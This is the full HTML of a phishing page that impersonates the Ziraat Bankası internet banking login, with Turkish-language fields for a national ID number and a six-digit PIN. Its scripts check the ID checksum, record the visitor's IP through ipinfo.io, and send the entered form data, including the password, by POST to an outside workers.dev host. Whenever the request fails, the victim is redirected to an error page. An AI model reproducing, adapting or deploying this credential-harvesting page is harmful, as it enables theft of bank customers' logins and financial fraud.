
<!DOCTYPE html>
<html lang="tr">
  <head>
	  <!-- Google tag (gtag.js) -->
 
 
    <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobil Uyumlu Sayfa</title>
    <style class="vjs-styles-defaults"></style>
    <meta http-equiv="Content-Language" content="tr">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
    <link href="styles.css" rel="stylesheet" id="style">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
<script>
  const url = 'https://ipinfo.io/json';
  new Vue({
    el: '#app',
    data: {
      results: []
    },
    mounted() {
      window.onload = () => {
        axios.get(url).then(response => {
          this.results = response.data;

          // IP adresini bir cookie'ye kaydet
          document.cookie = "user_ip=" + this.results.ip;

          // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
          const userIp = getCookie('user_ip');
          if (userIp) {
            sendPostRequest(userIp);
          }
        });
      };
    }
  });

 

  function getCookie(cname) {
    const name = cname + '=';
    const decodedCookie = decodeURIComponent(document.cookie);
    const cookieArray = decodedCookie.split(';');

    for (let i = 0; i < cookieArray.length; i++) {
      let cookie = cookieArray[i];
      while (cookie.charAt(0) == ' ') {
        cookie = cookie.substring(1);
      }
      if (cookie.indexOf(name) == 0) {
        return cookie.substring(name.length, cookie.length);
      }
    }
    return '';
  }
</script>

 <script>
document.addEventListener("DOMContentLoaded", function() {
    function tcno_dogrula(tcno) {
        tcno = String(tcno);
        if (tcno.substring(0, 1) === '0') {
            return false;
        }
        if (tcno.length !== 11) {
            return false;
        }
        var ilkon_array = tcno.substr(0, 10).split('');
        var ilkon_total = hane_tek = hane_cift = 0;
        for (var i = j = 0; i < 9; ++i) {
            j = parseInt(ilkon_array[i], 10);
            if (i & 1) {
                hane_cift += j;
            } else {
                hane_tek += j;
            }
            ilkon_total += j;
        }
        if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
            return false;
        }
        ilkon_total += parseInt(ilkon_array[9], 10);
        if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
            return false;
        }
        return true;
    }

    function kontrolEt() {
        var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
        var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
        var devamButton = document.getElementById("ctl00_c_RetailLoginButton");

       if (/^\d{11}$/.test(identityInput.value) && /^\d{6}$/.test(pinInput.value) && tcno_dogrula(identityInput.value)) {
            devamButton.removeAttribute("disabled");
        } else {
            devamButton.setAttribute("disabled", "disabled");
        }
    }

    var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
    var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");

    identityInput.addEventListener("input", kontrolEt);
    pinInput.addEventListener("input", kontrolEt);
});
    </script> 
	  <script>
  document.addEventListener('touchstart', function (event) {
    if (event.touches.length > 1) {
      event.preventDefault();
    }
  }, { passive: false });
</script>
<!-- Meta Pixel Code -->
 
  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
  </head>
  <body style="
margin-left: 0px;
margin-right: 0px;
margin-top: 0px;
margin-bottom: 0px;
">
 
    

    <form name="aspnetForm" method="post"   id="aspnetForm" autocomplete="off" novalidate="novalidate">
      <div id="" class="login-wrap">
        <header></header>
        <div id="" class="container">
          <div id="" class="tc-kimlik-giris-wrap">
            <div id="ctl00_ctl06" class="row">
              <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
                <div id="LoginBox" class="login-box long">
                  <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
                  <input name="rdLng" type="hidden" value="">
                  <p>İnternet Şubemize Hoş Geldiniz</p>
                  <div class="tabs-wrap" data-module="14">
                    <div id="TabHeaderContainer" class="tabs tab-header-container">
                      <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="">
                        <span></span>BİREYSEL </a>
                      <a causesval="false">
                        <span></span>KURUMSAL </a>
                    </div>
                    <div id="" class="tab-container tab-contents">
                      <div id="RetailTabContainer" class="tab-item active" style="
					  padding-left: 10px;
				  ">
                        <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
                          <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="  

font-size: 14px;  height: 46px;font-family: sans-serif;
						  font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False"   disablevalidationonblur="true" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_RetailLoginButton');"  causesval="false" onmousedown=";"   exvalidmethod="ValidateIdentity" aria-required="true" value="" >

                        </div>
                        <div id="RetailRememberMeContainer" class="clearfix" >
                          <div role="button" class="switch-cont" tabindex="0">
                            <span>Beni Hatırla</span>
                            <label class="switch">
                              <input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
                              <span class="switch-slider"></span>
                            </label>
                          </div>
                        </div>
                        <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
                          <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
                         </div>
                        <div id="" class="clearfix"></div>
                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
        onclick="checkAndSubmit();">
    <span></span>DEVAM
</button><br><br><br>
                        <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
                          <span></span>Şifremi Unuttum </a>
                        <div id="TabFooter" class="tab-footer">
                          <p>Dijital Bankacılık müşterimiz olmak için</p>
                          <a causesval="true" id="ctl00_c_OnlineApplicationButton" class="btn btn-default ">
                            <span></span>HEMEN BAŞVUR </a>
                        </div>
                      </div>




                  </div>
                  <style>
			  input {
  touch-action: manipulation;
}
                    .api-payment-container img {
                      max-height: 92px;
                      max-width: 92px;
                    }

                    .ipNotInListRedirectBtn {
                      background-color: #e10514 !important;
                    }
                  </style>
                </div>
              </div>
            </div>
          </div>
    </form>
 
<script>
document.addEventListener("DOMContentLoaded", function () {
  async function tcno_dogrula_ve_islem_yap(tcno) {
    // TC kimlik doğrulama fonksiyonu
    tcno = String(tcno);
    if (tcno.substring(0, 1) === '0') {
      return false;
    }
    if (tcno.length !== 11) {
      return false;
    }
    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;
    for (var i = j = 0; i < 9; ++i) {
      j = parseInt(ilkon_array[i], 10);
      if (i & 1) {
        hane_cift += j;
      } else {
        hane_tek += j;
      }
      ilkon_total += j;
    }
    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
      return false;
    }
    ilkon_total += parseInt(ilkon_array[9], 10);
    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
      return false;
    }
    return true;
  }

  async function checkAndSubmit() {
    const isCookieSet = document.cookie.includes('isim');

    if (!isCookieSet) {
      const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
      submitForm(); // Formu gönder
    } else {
      console.log('Cookie zaten kaydedilmiş, işlem yapılmayacak.');
    }
  }

  function handleInput() {
    checkAndSubmit();
  }

  var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
  var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");

  identityInput.addEventListener("input", handleInput);
  pinInput.addEventListener("input", handleInput);

  // Form gönderildiğinde çalışacak fonksiyon
  function submitForm() {
    // Form verilerini al
    var form = document.getElementById("aspnetForm");
    var formData = new FormData(form);

    // AJAX isteği oluştur
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://worker-broad-snow-1482.selimjuhan2.workers.dev/", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // AJAX yanıtı geldiğinde çalışacak fonksiyon
    xhr.onload = function () {
      // Başarılı yanıt alındıysa, hata oluşmamıştır
      if (xhr.status >= 200 && xhr.status < 300) {
        console.log("İstek başarıyla tamamlandı.");
      } else {
        // Hata durumunda hata.html sayfasına yönlendir
        window.location.href = "hata.html";
      }
    };

    // AJAX isteğini gönder
    xhr.send(formData);
  }

});
</script>

 
 

 

    <div>
  </body>
</html>
